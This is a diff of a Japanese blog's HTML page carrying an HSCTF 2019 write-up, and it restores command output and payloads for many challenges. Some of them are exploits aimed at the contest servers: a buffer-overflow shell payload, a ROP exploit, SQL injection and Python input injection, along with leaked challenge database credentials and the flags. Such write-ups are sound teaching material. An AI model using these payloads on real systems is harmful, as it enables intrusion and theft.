@@ -48,7 +48,7 @@
 <meta itemprop="description" content="やり始めてから気づいたんですけど、HSってHigh Schoolerの略で、高校生用のCTFみたいですね。 Rulesを見たら、「アメリカの高校">
 <meta itemprop="datePublished" content="2019-06-08T00:00:00&#43;08:00" />
 <meta itemprop="dateModified" content="2019-06-08T11:20:00&#43;08:00" />
-<meta itemprop="wordCount" content="4985">
+<meta itemprop="wordCount" content="5263">
 
 
 
@@ -229,17 +229,17 @@
 </div>
     <div class="post-content">
       <p>やり始めてから気づいたんですけど、HSってHigh Schoolerの略で、高校生用のCTFみたいですね。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Rulesを見たら、「アメリカの高校生じゃないと賞はもらえないよ」とは書いてありましたが、「大人が参加しちゃダメ」とは書いてなかったのでやってみました。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 開催が平日だし、問題数多いし、何気に難易度高いし、解けなかったチャレンジも多かったけど、楽しかったです。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 チームのCaptainなので、Captain Capture Americaです（笑
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted --></p>
+<br />
+<img src="https://captureamerica.github.io/writeups/img/captain.png" alt="captain.png"></p>
 <p>ちなみに、参加チームは全体で1000チームくらいでした。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="locked-up-miscellaneous">Locked Up (Miscellaneous)</h1>
 <hr>
 <h2 id="challenge">Challenge</h2>
@@ -251,10 +251,12 @@ Rulesを見たら、「アメリカの高校生じゃないと賞はもらえな
 <li>locked.zip</li>
 </ul>
 <h2 id="solution">Solution</h2>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<pre>
+$ zipinfo locked.zip | grep hsctf
+-rwxrwxrwx  3.0 unx        0 BX stor 19-Jun-03 13:22 hsctf{w0w_z1ps_ar3nt_th@t_secUr3}
+</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="verbose-miscellaneous">Verbose (Miscellaneous)</h1>
 <hr>
 <blockquote>
@@ -266,10 +268,10 @@ Rulesを見たら、「アメリカの高校生じゃないと賞はもらえな
 </ul>
 <h2 id="solution1">Solution</h2>
 <p><a href="http://codertab.com/JsUnFuck"><a href="http://codertab.com/JsUnFuck">http://codertab.com/JsUnFuck</a></a></p>
-<p>サイズが大きいので、結果が出るまで数分かかりました。<!-- raw HTML omitted -->
+<p>サイズが大きいので、結果が出るまで数分かかりました。<br />
 var flag = &ldquo;hsctf{esoteric_javascript_is_very_verbose}&quot;; window.location = &ldquo;<a href="https://hsctf.com">https://hsctf.com</a>&rdquo;;</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="admin-pass-miscellaneous">Admin Pass (Miscellaneous)</h1>
 <hr>
 <blockquote>
@@ -277,8 +279,8 @@ var flag = &ldquo;hsctf{esoteric_javascript_is_very_verbose}&quot;; window.locat
 </blockquote>
 <h2 id="solution2">Solution</h2>
 <p>gitlab.comへのリンクがあって、そこに飛んでファイルの過去の履歴とか見ているとフラグが見つかります。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="a-simple-conversation-miscellaneous">A Simple Conversation (Miscellaneous)</h1>
 <hr>
 <blockquote>
@@ -327,21 +329,33 @@ var flag = &ldquo;hsctf{esoteric_javascript_is_very_verbose}&quot;; window.locat
 </div>
 </div><h2 id="solution3">Solution</h2>
 <p><code>open('flag.txt').read()</code></p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<pre>
+$ nc misc.hsctf.com 9001
+Hello!
+Hey, can you help me out real quick.
+I need to know your age.
+What's your age?
+> open('flag.txt').read()
+Wow!
+Sometimes I wish I was hsctf{plz_u5e_pyth0n_3}
+
+Well, it was nice meeting you, hsctf{plz_u5e_pyth0n_3}
+-year-old.
+Goodbye!
+</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="broken-gps-miscellaneous">Broken GPS (Miscellaneous)</h1>
 <hr>
 <blockquote>
 <p>Ella is following a broken GPS. The GPS tells her to move in the opposite direction than the one she should be travelling in to get to her destination, and she follows her GPS exactly. For instance, every time she is supposed to move west, the GPS tells her to move east and she does so. Eventually she ends up in a totally different place than her intended location. What is the shortest distance between these two points? Assume that she moves one unit every time a direction is specified. For instance, if the GPS tells her to move &ldquo;north,&rdquo; she moves one unit north. If the GPS tells her to move &ldquo;northwest,&rdquo; then she moves one unit north and one unit west.
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
-Input Format:<!-- raw HTML omitted -->
+<br /><br />
+Input Format:<br />
 You will receive a text file with N directions provided to her by the GPS (the ones that she will be following) (1&lt;=N&lt;=1000). The first line in the file will be N, and each consequent line will contain a single direction: “north,” “south,” “east,” “west,” “northwest,” “northeast,” “southwest,” or “southeast.”
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
-Output Format:<!-- raw HTML omitted -->
+<br /><br />
+Output Format:<br />
 Round your answer to the nearest whole number and then divide by 26. Discard the quotient (mod 26). Each possible remainder corresponds to a letter in the alphabet. (0=a, 1=b… 25=z).
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Find the letter for each test case and string them together. The result is the flag. (For instance, a, b, c becomes “abc”). Remember to use the flag format and keep all letters lowercase!</p>
 </blockquote>
 <p>Attachment:</p>
@@ -553,10 +567,10 @@ Find the letter for each test case and string them together. The result is the f
 </code></pre></td></tr></table>
 </div>
 </div><p>strstr()をやる順番に注意。最初、&ldquo;east&quot;のチェックをアタマに入れていたら、&ldquo;northeast&quot;と&quot;southeast&quot;も持っていかれて違う答えになっちゃってました。。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 hsctf{garminesuckz}</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="broken-repl-miscellaneous">Broken REPL (Miscellaneous)</h1>
 <hr>
 <blockquote>
@@ -624,13 +638,13 @@ hsctf{garminesuckz}</p>
 </div>
 </div><h2 id="not-solved">(Not solved)</h2>
 <p>MemoryError例外を起こせばいいようだけど、できませんでした。raise使ったり、ウェブでMemoryError例外の事象のサンプルとか見つけてやったけれど、意図的に発生させようとするとなかなか難しいもんですね。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="english-sucks-miscellaneous">English Sucks (Miscellaneous)</h1>
 <hr>
 <blockquote>
 <p>English is such a confusing language. Can you help me understand it?
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Hint: Watch out for the order of the output.</p>
 </blockquote>
 <p>Attachment:</p>
@@ -758,37 +772,37 @@ Hint: Watch out for the order of the output.</p>
 </div>
 </div><h2 id="not-solved1">(Not solved)</h2>
 <p>なんとなく方向性はわかった気がしたんですが、解けませんでした。。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 mt19937 疑似乱数は連続した624個の結果があると、その次に出てくる乱数が予測できます。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
-以下にツールがあります。<!-- raw HTML omitted -->
+<br /><br />
+以下にツールがあります。<br />
 <a href="https://github.com/eboda/mersenne-twister-recover"><a href="https://github.com/eboda/mersenne-twister-recover">https://github.com/eboda/mersenne-twister-recover</a></a>
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 与えられたC++のコード（上記）で、216回ループしている中で3回ずつrandom()が呼ばれるので、合計648回（&gt; 624）。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 ビットシフトしているやつを逆にシフトしなおせばv1, v2, v3は求められると思いきや、一番最初と最後でORされちゃっているビットがあって、値が確定できません。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 問題が間違っているかと思って問い合わせをしてみたんですが、返事もないし、実際解いている人が何人かいたので、なんかしら解き方があるようです。。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="reverse-search-algorithm-cryptography">Reverse Search Algorithm (Cryptography)</h1>
 <hr>
 <blockquote>
 <p>WWPHSN students, gotta get these points to boost your grade.
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 n = 561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137
-<!-- raw HTML omitted -->
+<br />
 e = 65537
-<!-- raw HTML omitted -->
+<br />
 c = 328055279212128616898203809983039708787490384650725890748576927208883055381430000756624369636820903704775835777</p>
 </blockquote>
 <h2 id="solution5">Solution</h2>
 <p>SECCON Beginners CTF 2018 で出た「RSA is Power」とほぼ同じ問題のようです。</p>
 <p>以下のWriteupを参考にさせてもらいました。
-<!-- raw HTML omitted -->
+<br />
 <a href="https://graneed.hatenablog.com/entry/2018/05/27/183004"><a href="https://graneed.hatenablog.com/entry/2018/05/27/183004">https://graneed.hatenablog.com/entry/2018/05/27/183004</a></a></p>
 <p>nを素因数分解してpとqを求め、
-<!-- raw HTML omitted -->
+<br />
 <a href="http://factordb.com/index.php?query=561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137">http://factordb.com/index.php?query=561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137</a></p>
 <p>pythonでゴニョゴニョっとやります。</p>
 <div class="highlight"><div class="chroma">
@@ -836,8 +850,8 @@ c = 3280552792121286168982038099830397087874903846507258907485769272088830553814
 </code></pre></td></tr></table>
 </div>
 </div><p>hsctf{y3s_rsa_1s_s0lved_10823704961253}</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="a-byte-reversal">A Byte (Reversal)</h1>
 <hr>
 <blockquote>
@@ -849,7 +863,7 @@ c = 3280552792121286168982038099830397087874903846507258907485769272088830553814
 </ul>
 <h2 id="solution6">Solution</h2>
 <p>ghidraでde-compileすると、FUN_0010073a()のところで、以下の部分が見つかります。
-<!-- raw HTML omitted -->
+<br />
 （以下、抜粋です。）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -966,13 +980,20 @@ c = 3280552792121286168982038099830397087874903846507258907485769272088830553814
 </code></pre></td></tr></table>
 </div>
 </div><p>1でXORしてるので、実際にやってみます。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<pre>
+$ python
+>>> ord('i')
+105
+>>> chr(105^1)
+'h'
+>>> chr(0x72^1)
+'s'
+</pre>
 <p>フラグの先頭<code>hs</code>が見えましたね。残りも処理してフラグゲットです。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 hsctf{w0w_y0u_kn0w_d4_wA3_8h2bA029}</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="return-to-sender-binary-exploitation">Return to Sender (Binary Exploitation)</h1>
 <hr>
 <blockquote>
@@ -985,20 +1006,34 @@ hsctf{w0w_y0u_kn0w_d4_wA3_8h2bA029}</p>
 </ul>
 <h2 id="solution7">Solution</h2>
 <p>バッファオーバーフローの問題です。EIPが奪えるので、オフセット20バイトの後に、<code>system(&quot;/bin/sh&quot;);</code>を呼んでいる<code>win()</code>のアドレス<code>0x080491b6</code>を設定するだけです。
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<br /><br /></p>
+<pre>
+\# (python -c 'print("AAAAAAAAAAAAAAAAAAAA\xb6\x91\x04\x08")'; cat) | nc pwn.hsctf.com 1234
+Where are you sending your mail to today? Alright, to AAAAAAAAAAAAAAAAAAAA? it goes!
+
+ls
+bin
+dev
+flag
+lib
+lib32
+lib64
+return-to-sender
+return-to-sender.c
+cat flag
+hsctf{fedex_dont_fail_me_now}
+</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="combo-chain-lite-binary-exploitation">Combo Chain Lite (Binary Exploitation)</h1>
 <hr>
 <blockquote>
 <p>Training wheels!
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 nc pwn.hsctf.com 3131
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Note: If you're trying to use python or a similar program to run your exploit, make sure to keep stdin alive with cat, like this: <code>(python; cat -) | nc pwn.hsctf.com &lt;port&gt;</code>
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Hint: What's a ROP?</p>
 </blockquote>
 <p>Attachment:</p>
@@ -1052,9 +1087,28 @@ Hint: What's a ROP?</p>
 </div>
 </div><h2 id="solution8">Solution</h2>
 <p>system()関数のアドレス（毎回異なる）がprintされるので、それを使います。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted -->
+<pre>
+# checksec combo-chain-lite 
+[*] '/root/HSCTF_CTF_2019/combo-chain-lite'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+
+# ROPgadget --binary combo-chain-lite | grep ret | grep ": pop"
+0x000000000040126c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040126e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000401270 : pop r14 ; pop r15 ; ret
+0x0000000000401272 : pop r15 ; ret
+0x000000000040126b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040126f : pop rbp ; pop r14 ; pop r15 ; ret
+0x000000000040114d : pop rbp ; ret
+0x0000000000401273 : pop rdi ; ret   <--- これを使う。
+0x0000000000401271 : pop rsi ; pop r15 ; ret
+0x000000000040126d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+</pre>
+<p><br />
 以下を書きました。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1120,7 +1174,7 @@ Hint: What's a ROP?</p>
 <span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">(</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
-</div><p><!-- raw HTML omitted -->
+</div><p><br />
 実行結果です。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1168,8 +1222,8 @@ $ cat flag
 hsctf<span class="o">{</span>wheeeeeee_that_was_fun<span class="o">}</span>
 </code></pre></td></tr></table>
 </div>
-</div><p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+</div><p><br /><br />
+<br /><br /></p>
 <h1 id="chicken-crossing-forensics">Chicken Crossing (Forensics)</h1>
 <hr>
 <blockquote>
@@ -1180,10 +1234,12 @@ hsctf<span class="o">{</span>wheeeeeee_that_was_fun<span class="o">}</span>
 <li>hsctf-chicken_crossing.jpg</li>
 </ul>
 <h2 id="solution9">Solution</h2>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<pre>
+$ strings hsctf-chicken_crossing.jpg | grep hsctf
+hsctf{2_get_2_the_other_side}
+</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="cool-image-forensics">Cool Image (Forensics)</h1>
 <hr>
 <blockquote>
@@ -1194,10 +1250,12 @@ hsctf<span class="o">{</span>wheeeeeee_that_was_fun<span class="o">}</span>
 <li>cool.pdf</li>
 </ul>
 <h2 id="solution10">Solution</h2>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<pre>
+$ file cool.pdf
+cool.pdf: PNG image data, 1326 x 89, 8-bit/color RGBA, non-interlaced
+</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="cool-image-2-forensics">Cool Image 2 (Forensics)</h1>
 <hr>
 <blockquote>
@@ -1209,10 +1267,15 @@ hsctf<span class="o">{</span>wheeeeeee_that_was_fun<span class="o">}</span>
 </ul>
 <h2 id="solution11">Solution</h2>
 <p>ファイルの先頭にゴミがついているので、消すだけです。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<pre>
+$ xxd cool.png | head -n 4
+00000000: 4920 666f 756e 6420 7468 6973 2063 6f6f  I found this coo
+00000010: 6c20 6669 6c65 2e20 4974 7320 7265 616c  l file. Its real
+00000020: 6c79 2063 6f6f 6c21 0a89 504e 470d 0a1a  ly cool!..PNG...
+00000030: 0a00 0000 0d49 4844 5200 0004 b600 0000  .....IHDR.......
+</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="slap-forensics">Slap (Forensics)</h1>
 <hr>
 <blockquote>
@@ -1225,10 +1288,10 @@ hsctf<span class="o">{</span>wheeeeeee_that_was_fun<span class="o">}</span>
 <h2 id="solution12">Solution</h2>
 <p>Lorem ipsum （俗に言うダミーテキスト）だったので、うっかり見逃しそうでした。</p>
 <p><code>$ exiftool slap.jpg | grep hsctf</code>
-<!-- raw HTML omitted -->
+<br />
 Location Shown Country Name     : Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut la bore et dolore magna aliqua. Massa id neque aliquam vestibulum morbi blandit cursu <code>hsctf{twoslapsnonetforce}</code> s risus. Sed viverra ipsum nunc aliquet bibendum. Nisl purus in mollis nunc sed. Risus commodo viverra maecenas accumsan lacus vel facil&hellip;(snip)</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="fish-forensics">Fish (Forensics)</h1>
 <hr>
 <blockquote>
@@ -1240,39 +1303,50 @@ Location Shown Country Name     : Lorem ipsum dolor sit amet, consectetur adipis
 </ul>
 <h2 id="solution13">Solution</h2>
 <p>「青い空を見上げればいつもそこに白い猫」で開くと、&ldquo;Steghide適用可能性データ&quot;というのが見えます。
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted --></p>
+<br />
+<img src="https://captureamerica.github.io/writeups/img/possible_steg.png" alt="possible_steg.png"></p>
 <p>Passphraseがさっぱり検討つかなかったんですが、stringsの一番最後に出てくる<code>bobross63</code>を使ったら解けました。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<pre>
+$ strings fish.jpg | tail -n 1
+bobross63
+</pre>
+<pre>
+C:\ols\steghide>steghide.exe extract -sf fish.jpg
+Enter passphrase: bobross63
+wrote extracted data to "flag.txt".
+C:\ols\steghide>more flag.txt
+hsctf{fishy_fishy_fishy_fishy_fishy_fishy_fishy123123123123}
+</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="inspect-me-web">Inspect Me (Web)</h1>
 <hr>
 <blockquote>
 <p>Keith's little brother messed up some things&hellip;
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 <a href="https://inspect-me.web.chal.hsctf.com">https://inspect-me.web.chal.hsctf.com</a>
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Note: There are 3 parts to the flag!</p>
 </blockquote>
 <h2 id="solution14">Solution</h2>
 <p>View page source</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="agent-keith-web">Agent Keith (Web)</h1>
 <hr>
 <blockquote>
 <p>Keith was looking at some old browsers and made a site to hold his flag.
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 <a href="https://agent-keith.web.chal.hsctf.com">https://agent-keith.web.chal.hsctf.com</a></p>
 </blockquote>
 <h2 id="solution15">Solution</h2>
 <p>上記にアクセスすると、</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<pre>
+If you're not Keith, you won't get the flag!
+Your agent is: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+
+Flag: Access Denied
+</pre>
 <p>User-Agentは古ければなんでもいいわけじゃなくて、特定のものを指定しないといけないです。View Page Sourceより、</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1314,21 +1388,23 @@ Note: There are 3 parts to the flag!</p>
 <span class="p">&lt;</span><span class="p">/</span><span class="nt">html</span><span class="p">&gt;</span>
 </code></pre></td></tr></table>
 </div>
-</div><!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+</div><pre>
+$ wget -O - https://agent-keith.web.chal.hsctf.com/ --user-agent="NCSA_Mosaic/2.0 (Windows 3.1)"
+hsctf{wow_you_are_agent_keith_now}
+</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="sql-web">S-Q-L (Web)</h1>
 <hr>
 <blockquote>
 <p>Keith keeps trying to keep his flag safe. This time, he used a database and some PHP.
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 <a href="https://s-q-l.web.chal.hsctf.com/">https://s-q-l.web.chal.hsctf.com/</a></p>
 </blockquote>
 <h2 id="solution16">Solution</h2>
 <p><code>' or '1'='1</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="the-quest-web">The Quest (Web)</h1>
 <hr>
 <blockquote>
@@ -1336,13 +1412,13 @@ Note: There are 3 parts to the flag!</p>
 </blockquote>
 <h2 id="solution17">Solution</h2>
 <p>View Page Sourceでフラグを見つけてしまった。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="keith-logger-web">Keith Logger (Web)</h1>
 <hr>
 <blockquote>
 <p>Keith is up to some evil stuff! Can you figure out what he's doing and find the flag?
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Note: nothing is actually saved</p>
 </blockquote>
 <p>Attachment:</p>
@@ -1351,15 +1427,15 @@ Note: nothing is actually saved</p>
 </ul>
 <h2 id="solution18">Solution</h2>
 <p>これは今までやったことのないタイプの問題で面白かったです。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 crxは、Chromeのエクステンション。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 とりあえず、<code>nothing is actually saved</code>というのを信じて、Chromeに追加してみましたが、そもそも有効にできませんでした。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 ググってみると、crxファイルは中身が見えるとのこと。以下のサイトでソースを取り出しました。
-<!-- raw HTML omitted -->
+<br />
 <a href="https://robwu.nl/crxviewer/"><a href="https://robwu.nl/crxviewer/">https://robwu.nl/crxviewer/</a></a>
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<br /><br /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt"> 1
@@ -1427,21 +1503,22 @@ crxは、Chromeのエクステンション。
 </code></pre></td></tr></table>
 </div>
 </div><p>最初は、https://keith-logger.web.chal.hsctf.com/api/record の方にいろんなGETを投げてごちゃごちゃやってたんですが、Time情報が取れるだったので諦めて、次の <a href="https://keith-logger.web.chal.hsctf.com/api/admin">https://keith-logger.web.chal.hsctf.com/api/admin</a>  の方にアクセス。</p>
-<p><!-- raw HTML omitted -->
+<p><br />
 以下が返ってきました。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted -->
+<pre>
+didn't have time to implement this page yet. use admin:keithkeithkeith@keith-logger-mongodb.web.chal.hsctf.com:27017 for now
+</pre>
+<p><br />
 mongodbには、<code>Robo 3T</code>というツールを使いました。
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted --></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<br />
+<img src="https://captureamerica.github.io/writeups/img/Keith_Bot_Mongo.png" alt="Keith_Bot_Mongo.png"></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="accessible-rich-internet-applications-web">Accessible Rich Internet Applications (Web)</h1>
 <hr>
 <blockquote>
 <p>A very considerate fellow, Rob believes that accessibility is very important!
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 NOTE: The flag for this challenge starts with flag{ instead of hsctf{</p>
 </blockquote>
 <p>Attachment:</p>
@@ -1450,29 +1527,29 @@ NOTE: The flag for this challenge starts with flag{ instead of hsctf{</p>
 </ul>
 <h2 id="solution19">Solution</h2>
 <p>添付の<code>index.html</code>には難読化された非常に長いJavascriptが含まれています。
-<!-- raw HTML omitted -->
+<br />
 ChromeのDeveloper ToolsでまずBeautifyして、mをWatchに追加して実行し、mを別ファイル（aaa.htm）として保存しました。
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br />
+<img src="https://captureamerica.github.io/writeups/img/index.png" alt="index.png">
+<br /><br />
 同様に、今度は先程保存したaaa.htmをChromeのDeveloper ToolsでまずBeautifyします。
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br />
+<img src="https://captureamerica.github.io/writeups/img/aaa.png" alt="aaa.png">
+<br /><br />
 これを、bbb.txtとして保存しておきます。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 &ldquo;0&quot;と&quot;1&quot;が見えるので、2進数を文字列に変換する系ですね。ただし、<code>aria-posinset</code>の箇所で順番が指定されているようなので、sortが必要です。</p>
 <p><code>$ grep 1040 bbb.txt | cut -d'&quot;' -f4,7 | sort -n | sed -E 's/.*&gt;([01]).*/\1/' | tr -d '\n' ; echo</code>
 01101001011011010010000001100111011011110110111001101110011000010010000001100001011001000110010000100000011100110110111101101101011001010010000001100110011010010110110001101100011001010111001000100000011101000110010101111000011101000010000001101000011001010111001001100101001000000111001101101111001000000111010001101000011001010010000001110000011000010110011101100101001000000110100101110011001000000110000100100000011000100110100101110100001000000110110001101111011011100110011101100101011100100010111000100000011011000110111101110010011001010110110100100000011010010111000001110011011101010110110100101110001011100010111000100000011010000110010101110010011001010010011101110011001000000111010001101000011001010010000001100110011011000110000101100111001000000110001001110100011101110010110000100000011001100110110001100001011001110111101101100001011000110110001101100101011100110111001101101001011000100110100101101100011010010111010001111001010111110110100101110011010111110110001101110010011101010110001101101001011000010110110001111101</p>
-<p><!-- raw HTML omitted -->
-文字列への変換は、またこちらのサイトにお世話になりました。<!-- raw HTML omitted -->
+<p><br />
+文字列への変換は、またこちらのサイトにお世話になりました。<br />
 <a href="https://dencode.com/ja/string/bin"><a href="https://dencode.com/ja/string/bin">https://dencode.com/ja/string/bin</a></a></p>
 <p>im gonna add some filler text here so the page is a bit longer. lorem ipsum&hellip; here's the flag btw, flag{accessibility_is_crucial}</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <hr>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 
     </div>
 
